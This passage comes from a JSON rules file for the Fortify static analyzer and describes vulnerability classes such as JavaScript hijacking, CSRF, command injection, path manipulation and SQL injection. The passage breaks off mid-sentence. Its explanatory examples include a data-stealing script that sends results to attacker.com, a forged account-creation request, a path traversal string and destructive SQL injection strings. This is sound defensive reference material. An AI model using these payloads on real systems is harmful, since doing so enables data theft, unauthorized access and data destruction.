                "text": "An application may be vulnerable to JavaScript hijacking if it: 1) Uses JavaScript objects as a data transfer format 2) Handles confidential data. Because JavaScript hijacking vulnerabilities do not occur as a direct result of a coding mistake, the Fortify Secure Coding Rulepacks call attention to potential JavaScript hijacking vulnerabilities by identifying code that appears to generate JavaScript in an HTTP response.\r\n\r\nWeb browsers enforce the Same Origin Policy in order to protect users from malicious websites. The Same Origin Policy requires that, in order for JavaScript to access the contents of a web page, both the JavaScript and the web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. JavaScript hijacking allows an attacker to bypass the Same Origin Policy in the case that a web application uses JavaScript to communicate confidential information. The loophole in the Same Origin Policy is that it allows JavaScript from any website to be included and executed in the context of any other website. Even though a malicious site cannot directly examine any data loaded from a vulnerable site on the client, it can still take advantage of this loophole by setting up an environment that allows it to witness the execution of the JavaScript and any relevant side effects it may have. Since many Web 2.0 applications use JavaScript as a data transport mechanism, they are often vulnerable while traditional web applications are not.\r\n\r\nThe most popular format for communicating information in JavaScript is JavaScript Object Notation (JSON). The JSON RFC defines JSON syntax to be a subset of JavaScript object literal syntax. JSON is based on two types of data structures: arrays and objects. Any data transport format where messages can be interpreted as one or more valid JavaScript statements is vulnerable to JavaScript hijacking. JSON makes JavaScript hijacking easier by the fact that a JSON array stands on its own as a valid JavaScript statement. Since arrays are a natural form for communicating lists, they are commonly used wherever an application needs to communicate multiple values. Put another way, a JSON array is directly vulnerable to JavaScript hijacking. A JSON object is only vulnerable if it is wrapped in some other JavaScript construct that stands on its own as a valid JavaScript statement.\r\n\r\n**Example 1:** The following example begins by showing a legitimate JSON interaction between the client and server components of a web application used to manage sales leads. It goes on to show how an attacker may mimic the client and gain access to the confidential data the server returns. Note that this example is written for Mozilla-based browsers. Other mainstream browsers do not allow native constructors to be overridden when an object is created without the use of the new operator.\r\n\r\nThe client requests data from a server and evaluates the result as JSON with the following code:\r\n\r\n`\nvar object;\nvar req = new XMLHttpRequest();\nreq.open(\"GET\", \"/object.json\",true);\nreq.onreadystatechange = function () {\n  if (req.readyState == 4) {\n    var txt = req.responseText;\n    object = eval(\"(\" + txt + \")\");\n    req = null;\n  }\n};\nreq.send(null);\n`\r\n\r\nWhen the code runs, it generates an HTTP request that looks like this:\r\n\r\n`\nGET /object.json HTTP/1.1\n...\nHost: www.example.com\nCookie: JSESSIONID=F2rN6HopNzsfXFjHX1c5Ozxi0J5SQZTr4a5YJaSbAiTnRR\n`\r\n\r\n(In this HTTP response and the one that follows we have elided HTTP headers that are not directly relevant to this explanation.)\nThe server responds with an array in JSON format:\r\n\r\n`\nHTTP/1.1 200 OK\nCache-control: private\nContent-Type: text/JavaScript; charset=utf-8\n...\n[{\"fname\":\"Brian\", \"lname\":\"Chess\", \"phone\":\"6502135600\",\n  \"purchases\":60000.00, \"email\":\"brian@example.com\" },\n {\"fname\":\"Katrina\", \"lname\":\"O'Neil\", \"phone\":\"6502135600\",\n  \"purchases\":120000.00, \"email\":\"katrina@example.com\" },\n {\"fname\":\"Jacob\", \"lname\":\"West\", \"phone\":\"6502135600\",\n  \"purchases\":45000.00, \"email\":\"jacob@example.com\" }]\n`\r\n\r\nIn this case, the JSON contains confidential information associated with the current user (a list of sales leads). Other users cannot access this information without knowing the user's session identifier. (In most modern web applications, the session identifier is stored as a cookie.) However, if a victim visits a malicious website, the malicious site can retrieve the information using JavaScript hijacking. If a victim can be tricked into visiting a web page that contains the following malicious code, the victim's lead information will be sent to the attacker's web site.\r\n\r\n`\n&lt;script&gt;\n// override the constructor used to create all objects so\n// that whenever the \"email\" field is set, the method\n// captureObject() will run. Since \"email\" is the final field,\n// this will allow us to steal the whole object.\nfunction Object() {\n this.email setter = captureObject;\n}\r\n\r\n// Send the captured object back to the attacker's web site\nfunction captureObject(x) {\n  var objString = \"\";\n  for (fld in this) {\n    objString += fld + \": \" + this[fld] + \", \";\n  }\n  objString += \"email: \" + x;\n  var req = new XMLHttpRequest();\n  req.open(\"GET\", \"http://attacker.com?obj=\" +\n           escape(objString),true);\n  req.send(null);\n}\n&lt;/script&gt;\r\n\r\n&lt;!-- Use a script tag to bring in victim's data --&gt;\n&lt;script src=\"http://www.example.com/object.json\"&gt;&lt;/script&gt;\n`\r\n\r\nThe malicious code uses a script tag to include the JSON object in the current page. The web browser will send up the appropriate session cookie with the request. In other words, this request will be handled just as though it had originated from the legitimate application.\r\n\r\nWhen the JSON array arrives on the client, it will be evaluated in the context of the malicious page. In order to witness the evaluation of the JSON, the malicious page has redefined the JavaScript function used to create new objects. In this way, the malicious code has inserted a hook that allows it to get access to the creation of each object and transmit the object's contents back to the malicious site. Other attacks might override the default constructor for arrays instead. Applications that are built to be used in a mashup sometimes invoke a callback function at the end of each JavaScript message. The callback function is meant to be defined by another application in the mashup. A callback function makes a JavaScript hijacking attack a trivial affair -- all the attacker has to do is define the function. An application can be mashup-friendly or it can be secure, but it cannot be both. If the user is not logged into the vulnerable site, the attacker may compensate by asking the user to log in and then displaying the legitimate login page for the application.\r\n\r\nThis is not a phishing attack -- the attacker does not gain access to the user's credentials -- so anti-phishing countermeasures will not be able to defeat the attack. More complex attacks could make a series of requests to the application by using JavaScript to dynamically generate script tags. This same technique is sometimes used to create application mashups. The only difference is that, in this mashup scenario, one of the applications involved is malicious."
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "None",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "3B074389-826B-4DDA-9FEF-05ECD125D1FC",
              "guid": "3B074389-826B-4DDA-9FEF-05ECD125D1FC",
              "name": "Code Quality/Code Correctness/Erroneous String Compare",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} should compare strings with the `equals()` method, not `==` or `!=`.\r\nStrings should be compared with the `equals()` method, not `==` or `!=`."
              },
              "fullDescription": {
                "text": "This program uses `==` or `!=` to compare two strings for equality, which compares two objects for equality, not their values. Chances are good that the two references will never be equal.\r\n\r\n**Example 1:** The following branch will never be taken.\r\n\r\n`\n  if (args[0] == STRING_CONSTANT) {\n      logger.info(\"miracle\");\n  }\n`\r\n\r\nThe `==` and `!=` operators will only behave as expected when they are used to compare strings contained in objects that are equal. The most common way for this to occur is for the strings to be interned, whereby the strings are added to a pool of objects maintained by the `String` class. Once a string is interned, all uses of that string will use the same object and equality operators will behave as expected. All string literals and string-valued constants are interned automatically. Other strings can be interned manually be calling `String.intern()`, which will return a canonical instance of the current string, creating one if necessary."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "597",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A",
              "guid": "DCA98C06-0D99-4EE0-ADA4-A4FA86FDE47A",
              "name": "Encapsulation/System Information Leak/Internal",
              "shortDescription": {
                "text": "The function {EnclosingFunction.name} in {PrimaryLocation.file} might reveal system data or debugging information by calling {PrimaryCall.name} on line {PrimaryLocation.line}. The information revealed by {PrimaryCall.name} could help an adversary form a plan of attack.\r\nRevealing system data or debugging information helps an adversary learn about the system and form a plan of attack."
              },
              "fullDescription": {
                "text": "An internal information leak occurs when system data or debugging information is sent to a local file, console, or screen via printing or logging.\r\n\r\nIn this case <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> is called in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code prints an exception to the standard error stream:\r\n\r\n`\ntry {\n    ...\n} catch (Exception e) {\n    e.printStackTrace();\n}\n`\r\n\r\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a user. In some cases the error message tells the attacker precisely what sort of an attack the system is vulnerable to. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In the example above, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\r\n\r\nIn the mobile world, information leaks are also a concern.\r\n\r\n**Example 2:** The code below logs the stack trace of a caught exception on the Android platform.\n`\n...\ntry {\n  ...\n} catch (Exception e) {\n    Log.e(TAG, Log.getStackTraceString(e));\n}\n...\n`"
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "497",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "919BF191-6443-4239-BBFF-A7A31C108032",
              "guid": "919BF191-6443-4239-BBFF-A7A31C108032",
              "name": "Security Features/Insecure Randomness",
              "shortDescription": {
                "text": "The random number generator implemented by {PrimaryCall.name} cannot withstand a cryptographic attack.\r\nStandard pseudorandom number generators cannot withstand cryptographic attacks."
              },
              "fullDescription": {
                "text": "Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in a security-sensitive context.\r\n\r\nIn this case the function that generates weak random numbers is <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\nComputers are deterministic machines, and as such are unable to produce true randomness. Pseudorandom Number Generators (PRNGs) approximate randomness algorithmically, starting with a seed from which subsequent values are calculated.\r\n\r\nThere are two types of PRNGs: statistical and cryptographic. Statistical PRNGs provide useful statistical properties, but their output is highly predictable and form an easy to reproduce numeric stream that is unsuitable for use in cases where security depends on generated values being unpredictable. Cryptographic PRNGs address this problem by generating output that is more difficult to predict. For a value to be cryptographically secure, it must be impossible or highly improbable for an attacker to distinguish between the generated random value and a truly random value. In general, if a PRNG algorithm is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts, where its use can lead to serious vulnerabilities such as easy-to-guess temporary passwords, predictable cryptographic keys, session hijacking, and DNS spoofing.\r\n\r\n**Example:** The following code uses a statistical PRNG to create a URL for a receipt that remains active for some period of time after a purchase.\r\n\r\n`\nfunction genReceiptURL (baseURL){\n  var randNum = Math.random();\n  var receiptURL = baseURL + randNum + \".html\";\n  return receiptURL;\n}\n`\r\n\r\nThis code uses the `Math.random()` function to generate \"unique\" identifiers for the receipt pages it generates. Since `Math.random()` is a statistical PRNG, it is easy for an attacker to guess the strings it generates. Although the underlying design of the receipt system is also faulty, it would be more secure if it used a random number generator that did not produce predictable receipt identifiers, such as a cryptographic PRNG."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "338",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "2.0",
                "Impact": "4.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "69777D84-8507-40A7-9C2B-0B18E4A5EB0A",
              "guid": "69777D84-8507-40A7-9C2B-0B18E4A5EB0A",
              "name": "Input Validation and Representation/Command Injection",
              "shortDescription": {
                "text": "The method {EnclosingFunction.name} in {PrimaryLocation.file} calls {PrimaryCall.name} to execute a command. This call might allow an attacker to inject malicious commands.\r\nExecuting commands that include unvalidated user input can cause an application to execute malicious commands on behalf of an attacker."
              },
              "fullDescription": {
                "text": "Command injection vulnerabilities take two forms:\r\n\r\n- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.\r\n\r\n- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.\r\n\r\nIn this case we are primarily concerned with the second scenario, the possibility that an attacker may be able to change the meaning of the command by changing an environment variable or by putting a malicious executable early in the search path. Command injection vulnerabilities of this type occur when:\r\n\r\n1. An attacker modifies an application's environment.\r\n\r\n2. The application executes a command without specifying an absolute path or verifying the binary being executed.\r\n\r\nIn this case the command is executed by <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.\r\n\r\n**Example:** The following code is from a web application that allows users access to an interface through which they can update their password on the system. Part of the process for updating passwords in certain network environments is to run a `make` command in the `/var/yp` directory, the code for which is shown below.\r\n\r\n`\n...\nSystem.Runtime.getRuntime().exec(\"make\");\n...\n`\r\n\r\nThe problem here is that the program does not specify an absolute path for make and fails to clean its environment prior to executing the call to `Runtime.exec()`. If an attacker can modify the `$PATH` variable to point to a malicious binary called `make` and then execute the application in their environment, the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's `make` will now be run with these privileges, possibly giving them complete control of the system."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "77",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "78",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "2.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "F9D3C462-8D1E-4457-967F-9F082B973F88",
              "guid": "F9D3C462-8D1E-4457-967F-9F082B973F88",
              "name": "Security Features/Password Management/Hardcoded Password",
              "shortDescription": {
                "text": "Hardcoded passwords may compromise system security in a way that cannot be easily remedied."
              },
              "fullDescription": {
                "text": "It is never a good idea to hardcode a password. Not only does hardcoding a password allow all of the project's developers to view the password, it also makes fixing the problem extremely difficult. Once the code is in production, the password cannot be changed without patching the software. If the account protected by the password is compromised, the owners of the system will be forced to choose between security and availability.\r\n\r\nIn this case a hardcoded password was found in the call to <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code uses a hardcoded password to connect to a database:\r\n\r\n`\n...\nDriverManager.getConnection(url, \"scott\", \"tiger\");\n...\n`\r\n\r\nThis code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is likely no way to change the database user \"scott\" with a password of \"tiger\" unless the program is patched. An employee with access to this information could use it to break into the system. Even worse, if attackers have access to the bytecode for the application they can use the `javap -c` command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:\r\n\r\n`\njavap -c ConnMngr.class\r\n\r\n22: ldc   #36; //String jdbc:mysql://ixne.com/rxsql\n24: ldc   #38; //String scott\n26: ldc   #17; //String tiger\n`\r\n\r\nIn the mobile world, password management is even trickier, considering a much higher chance of device loss.\n**Example 2:** The code below uses hardcoded username and password to setup authentication for viewing protected pages with Android's WebView.\n`\n...\nwebview.setWebViewClient(new WebViewClient() {\n  public void onReceivedHttpAuthRequest(WebView view,\n        HttpAuthHandler handler, String host, String realm) {\n    handler.proceed(\"guest\", \"allow\");\n  }\n});\n...\n`\r\n\r\nSimilar to Example 1, this code will run successfully, but anyone who has access to it will have access to the password."
              },
              "defaultConfiguration": {
                "level": "error",
                "properties": {
                  "DefaultSeverity": "4.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "259",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "798",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "4",
                "Impact": "4.0",
                "Probability": "4.0"
              }
            },
            {
              "id": "C7D64877-9D39-40E0-9510-5B7051F6E778",
              "guid": "C7D64877-9D39-40E0-9510-5B7051F6E778",
              "name": "API Abuse/Often Misused/Authentication",
              "shortDescription": {
                "text": "The information returned by the call to {PrimaryCall.name} is not trustworthy. Attackers may spoof DNS entries. Do not rely on DNS for security.\r\nAttackers may spoof DNS entries. Do not rely on DNS names for security."
              },
              "fullDescription": {
                "text": "Many DNS servers are susceptible to spoofing attacks, so you should assume that your software will someday run in an environment with a compromised DNS server. If attackers are allowed to make DNS updates (sometimes called DNS cache poisoning), they can route your network traffic through their machines or make it appear as if their IP addresses are part of your domain. Do not base the security of your system on DNS names.\r\n\r\nIn this case, DNS information enters the program at <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example:** The following code uses a DNS lookup to determine whether an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.\r\n\r\n`\n String ip = request.getRemoteAddr();\n InetAddress addr = InetAddress.getByName(ip);\n if (addr.getCanonicalHostName().endsWith(\"trustme.com\")) {\n trusted = true;\n }\n`\r\n\r\nIP addresses are more reliable than DNS names, but they can also be spoofed. Attackers may easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "247",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "292",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "558",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "807",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "1.0",
                "Impact": "3.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "0C82D0B5-1B23-4D56-B38E-F6263A454766",
              "guid": "0C82D0B5-1B23-4D56-B38E-F6263A454766",
              "name": "Code Quality/Dead Code/Expression is Always true",
              "shortDescription": {
                "text": "The expression (or part of it) at {PrimaryLocation.file} line {PrimaryLocation.line} will always evaluate to `true`.\r\nThis expression (or part of it) will always evaluate to `true`."
              },
              "fullDescription": {
                "text": "This expression (or part of it) will always evaluate to `true`; the program could be rewritten in a simpler form. The nearby code may be present for debugging purposes, or it may not have been maintained along with the rest of the program. The expression may also be indicative of a bug earlier in the method.\r\n\r\n**Example 1:** The following method never sets the variable `secondCall` after initializing it to `true`. (The variable `firstCall` is mistakenly used twice.)  The result is that the expression `firstCall || secondCall` will always evaluate to `true`, so `setUpForCall()` will always be invoked.\r\n\r\n`\npublic void setUpCalls() {\n  boolean firstCall = true;\n  boolean secondCall = true;\r\n\r\n  if (fCall &lt; 0) {\n    cancelFCall();\n    firstCall = false;\n  }\n  if (sCall &lt; 0) {\n    cancelSCall();\n    firstCall = false;\n  }\r\n\r\n  if (firstCall || secondCall) {\n    setUpForCall();\n  }\n}\n`\r\n\r\n**Example 2:** The following method tries to check the variables `firstCall` and `secondCall`. (The variable `firstCall` is mistakenly set to `true` instead of being checked.)  The result is that the first part of the expression `firstCall = true &amp;&amp; secondCall == true` will always evaluate to `true`.\r\n\r\n`\npublic void setUpCalls() {\n  boolean firstCall = false;\n  boolean secondCall = false;\r\n\r\n  if (fCall &gt; 0) {\n    setUpFCall();\n    firstCall = true;\n  }\n  if (sCall &gt; 0) {\n    setUpSCall();\n    secondCall = true;\n  }\r\n\r\n  if (firstCall = true &amp;&amp; secondCall == true) {\n    setUpDualCall();\n  }\n}\n`"
              },
              "defaultConfiguration": {
                "level": "note",
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "571",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "3.0",
                "Impact": "1.0",
                "Probability": "1.0"
              }
            },
            {
              "id": "B51DDE61-34C8-4E4E-BB93-88644FACFBBB",
              "guid": "B51DDE61-34C8-4E4E-BB93-88644FACFBBB",
              "name": "Input Validation and Representation/Path Manipulation",
              "shortDescription": {
                "text": "Attackers are able to control the file system path argument to {PrimaryCall.name} at {PrimaryLocation.file} line {PrimaryLocation.line}, which allows them to access or modify otherwise protected files.\r\nAllowing user input to control paths used in file system operations could enable an attacker to access or modify otherwise protected system resources."
              },
              "fullDescription": {
                "text": "Path manipulation errors occur when the following two conditions are met:\r\n\r\n1. An attacker is able to specify a path used in an operation on the file system.\r\n\r\n2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.\r\n\r\nFor example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.\r\n\r\nIn this case, the attacker may specify the value that enters the program at <Replace key=\"SourceFunction\" link=\"SourceLocation\"/> in {SourceLocation.file} at line {SourceLocation.line}, and this value is used to access a file system resource at <Replace key=\"SinkFunction\" link=\"SinkLocation\"/> in {SinkLocation.file} at line {SinkLocation.line}.\r\n\r\nEven though the data in this case is a number, it is unvalidated and thus still considered malicious, hence the vulnerability is still reported but with reduced priority values.\r\n\r\n**Example 1:** The following code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as \"`../../tomcat/conf/server.xml`\", which causes the application to delete one of its own configuration files.\r\n\r\n`\nString rName = request.getParameter(\"reportName\");\nFile rFile = new File(\"/usr/local/apfr/reports/\" + rName);\n...\nrFile.delete();\n`\r\n\r\n**Example 2:** The following code uses input from a configuration file to determine which file to open and echo back to the user. If the program runs with adequate privileges and malicious users can change the configuration file, they can use the program to read any file on the system that ends with the extension `.txt`.\r\n\r\n`\nfis = new FileInputStream(cfg.getProperty(\"sub\")+\".txt\");\namt = fis.read(arr);\nout.println(arr);\n`\r\n\r\nSome think that in the mobile world, classic vulnerabilities, such as path manipulation, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.\r\n\r\n**Example 3:** The following code adapts Example 1 to the Android platform.\r\n\r\n`\n...\n        String rName = this.getIntent().getExtras().getString(\"reportName\");\n        File rFile = getBaseContext().getFileStreamPath(rName);\n...\n        rFile.delete();\n...\n`"
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "3.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "22",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                },
                {
                  "target": {
                    "id": "73",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Impact": "3",
                "Probability": "1",
                "Accuracy": "4.0"
              }
            },
            {
              "id": "114E5A67-3446-4DD5-B578-D0E6FDBB304E",
              "guid": "114E5A67-3446-4DD5-B578-D0E6FDBB304E",
              "name": "Encapsulation/Cross-Site Request Forgery",
              "shortDescription": {
                "text": "The HTTP request at {PrimaryLocation.file} line {PrimaryLocation.line} must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.\r\nHTTP requests must contain a user-specific secret in order to prevent an attacker from making unauthorized requests."
              },
              "fullDescription": {
                "text": "A cross-site request forgery (CSRF) vulnerability occurs when:\n1. A web application uses session cookies.\r\n\r\n2. The application acts on an HTTP request without verifying that the request was made with the user's consent.\r\n\r\nIn this case the application generates an HTTP request at {PrimaryLocation.file} line {PrimaryLocation.line}.\r\n\r\nA nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application). This means a web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a web application that allows administrators to create new accounts as follows:\r\n\r\n`\n  var req = new XMLHttpRequest();\n  req.open(\"POST\", \"/new_user\", true);\n  body = addToPost(body, new_username);\n  body = addToPost(body, new_passwd);\n  req.send(body);\n`\r\n\r\nAn attacker might set up a malicious web site that contains the following code.\r\n\r\n`\n  var req = new XMLHttpRequest();\n  req.open(\"POST\", \"http://www.example.com/new_user\", true);\n  body = addToPost(body, \"attacker\");\n  body = addToPost(body, \"haha\");\n  req.send(body);\n`\r\n\r\nIf an administrator for `example.com` visits the malicious page while she has an active session on the site, she will unwittingly create an account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application.\r\n\r\nApplications that pass the session identifier in the URL rather than as a cookie do not have CSRF problems because there is no way for the attacker to access the session identifier and include it as part of the bogus request.\nCSRF is entry number five on the 2007 OWASP Top 10 list."
              },
              "defaultConfiguration": {
                "properties": {
                  "DefaultSeverity": "2.0"
                }
              },
              "relationships": [
                {
                  "target": {
                    "id": "352",
                    "toolComponent": {
                      "name": "CWE",
                      "guid": "25F72D7E-8A92-459D-AD67-64853F788765"
                    }
                  },
                  "kinds": [
                    "relevant"
                  ]
                }
              ],
              "properties": {
                "Accuracy": "1.0",
                "Impact": "2.0",
                "Probability": "2.0"
              }
            },
            {
              "id": "AB181F77-DEC9-44BE-A798-47D9CBA60BD0",
              "guid": "AB181F77-DEC9-44BE-A798-47D9CBA60BD0",
              "name": "Input Validation and Representation/SQL Injection",
              "shortDescription": {
                "text": "On line {PrimaryLocation.line} of {PrimaryLocation.file}, the method {EnclosingFunction.name} invokes a SQL query built using input potentially coming from an untrusted source. This call could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.\r\nConstructing a dynamic SQL statement with input coming from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands."
              },
              "fullDescription": {
                "text": "SQL injection errors occur when:\r\n\r\n1. Data enters a program from an untrusted source.\r\n\r\nIn this case Fortify Static Code Analyzer could not determine that the source of the data is trusted.\r\n\r\n2. The data is used to dynamically construct a SQL query.\r\n\r\nIn this case the data is passed to <Replace key=\"PrimaryCall.name\" link=\"PrimaryLocation\"/> in {PrimaryLocation.file} at line {PrimaryLocation.line}.\r\n\r\n**Example 1:** The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.\r\n\r\n`\n...\n\tString userName = ctx.getAuthenticatedUserName();\n\tString itemName = request.getParameter(\"itemName\");\n\tString query = \"SELECT * FROM items WHERE owner = '\"\n\t\t\t\t+ userName + \"' AND itemname = '\"\n\t\t\t\t+ itemName + \"'\";\n\tResultSet rs = stmt.execute(query);\n...\n`\r\n\r\nThe query that this code intends to execute follows:\r\n\r\n`\n\tSELECT * FROM items\n\tWHERE owner = &lt;userName&gt;\n\tAND itemname = &lt;itemName&gt;;\n`\r\n\r\nHowever, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if `itemName` does not contain a single-quote character. If an attacker with the user name `wiley` enters the string \"`name' OR 'a'='a`\" for `itemName`, then the query becomes the following:\r\n\r\n`\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name' OR 'a'='a';\n`\r\n\r\nThe addition of the `OR 'a'='a'` condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:\r\n\r\n`\n\tSELECT * FROM items;\n`\r\n\r\nThis simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the `items` table, regardless of their specified owner.\r\n\r\n**Example 2:** This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name `wiley` enters the string \"`name'; DELETE FROM items; --`\" for `itemName`, then the query becomes the following two queries:\r\n\r\n`\n\tSELECT * FROM items\n\tWHERE owner = 'wiley'\n\tAND itemname = 'name';\r\n\r\n\tDELETE FROM items;\r\n\r\n\t--'\n`\r\n\r\nMany database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.\r\n\r\nNotice the trailing pair 